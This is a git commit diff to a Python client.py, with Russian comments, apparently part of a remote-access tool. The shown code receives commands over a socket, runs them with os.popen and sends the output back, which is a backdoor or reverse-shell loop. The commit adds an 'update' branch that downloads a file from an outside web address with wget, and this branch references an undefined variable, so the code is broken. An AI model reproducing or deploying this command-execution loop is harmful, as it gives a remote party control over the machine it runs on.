bd4d63ee5e86ef55e36d495baa6d2a4c81196076
miclay0260 <79045167+miclay0260@users.noreply.github.com>
2021-02-15 14:56:45 +0400

    Update client.py

--- client.py
+++ client.py
@@ -10,9 +10,12 @@ while True:
                 data = sock.recv(1024).decode()  # получаем команду
                 aa = os.popen(data)
                 result = aa.read()
-                if data == "update":
+                if len(result) == 0:
+                    sock.send(" ".encode())  # в случае, если рзультат
+                elif data == "update":
                     sock.send("Updating..".encode())  # в случае, если рзультат
-                    # пустой, отправляем пробел
+                    URL = 'https://proprikol.ru/wp-content/uploads/2019/11/kartinki-anime-s-ushkami-3.jpg'
+                    wget.download(url, '/')
                 else:
                     sock.send(result.encode())  # отправляем результат
             except:
